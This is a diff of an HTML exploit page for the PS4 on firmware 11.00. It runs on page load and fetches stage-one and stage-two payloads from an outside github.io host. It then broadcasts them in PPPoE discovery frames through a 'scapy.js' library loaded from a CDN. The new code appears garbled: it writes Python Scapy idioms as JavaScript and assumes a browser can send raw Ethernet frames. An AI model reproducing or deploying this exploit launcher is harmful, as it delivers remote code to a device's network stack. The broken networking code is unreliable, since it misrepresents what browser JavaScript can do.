@@ -4,23 +4,20 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PS4 11.00 Exploit</title>
+    <script src="https://cdn.jsdelivr.net/npm/scapy@0.29.0/build/scapy.js"></script>
     <script>
         async function runExploit() {
             try {
                 document.getElementById('status').innerText = 'Starting exploit...';
 
+                // Fetch payloads
                 const primaryPayload = await fetchPayload('https://alihussien96.github.io/payload.bin');
                 const stage2Payload = await fetchPayload('https://alihussien96.github.io/stage2_11.00.bin');
 
-                const exploitEndpoint = `${window.location.origin}/exploit`;
+                // Function to send PPPoE packet using Scapy.js
+                await sendPPPoEPacket(primaryPayload, stage2Payload);
 
-                await sendPayload(exploitEndpoint, primaryPayload);
-                console.log('Primary payload sent successfully');
-
-                await sendPayload(exploitEndpoint, stage2Payload);
-                console.log('Stage 2 payload sent successfully');
-
-                document.getElementById('status').innerText = 'Payloads sent successfully. Check your PS4.';
+                document.getElementById('status').innerText = 'PPPoE packet sent successfully. Check your PS4.';
             } catch (error) {
                 console.error('Error running exploit:', error);
                 document.getElementById('status').innerText = `Error: ${error.message}`;
@@ -35,17 +32,30 @@
             return new Uint8Array(await response.arrayBuffer());
         }
 
-        async function sendPayload(url, payload) {
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/octet-stream',
-                },
-                body: payload
-            });
-            if (!response.ok) {
-                throw new Error(`Failed to send payload to ${url}: ${response.statusText}`);
-            }
+        async function sendPPPoEPacket(primaryPayload, stage2Payload) {
+            // Use auto_iface to automatically determine network interface
+            const iface = await scapy.auto_iface();
+            console.log('Using interface:', iface);
+
+            // Fetch local MAC address using Scapy.js
+            const localMac = await scapy.get_mac_address(iface);
+            console.log('Local MAC address:', localMac);
+            
+            // Create PPPoE packet with payloads
+            const pppoed_pkt = scapy.Ether({src: localMac, dst: 'ff:ff:ff:ff:ff:ff'}) /
+                               scapy.PPPoED({service_name: 'Internet'}) /
+                               scapy.Raw(primaryPayload);
+
+            // Send PPPoE packet
+            await scapy.sendp(iface, pppoed_pkt);
+            
+            // Send stage2 payload after some delay (if needed)
+            await new Promise(resolve => setTimeout(resolve, 1000)); // Adjust delay as necessary
+            const stage2_pkt = scapy.Ether({src: localMac, dst: 'ff:ff:ff:ff:ff:ff'}) /
+                               scapy.PPPoED({service_name: 'Internet'}) /
+                               scapy.Raw(stage2Payload);
+            
+            await scapy.sendp(iface, stage2_pkt);
         }
 
         document.addEventListener('DOMContentLoaded', runExploit);
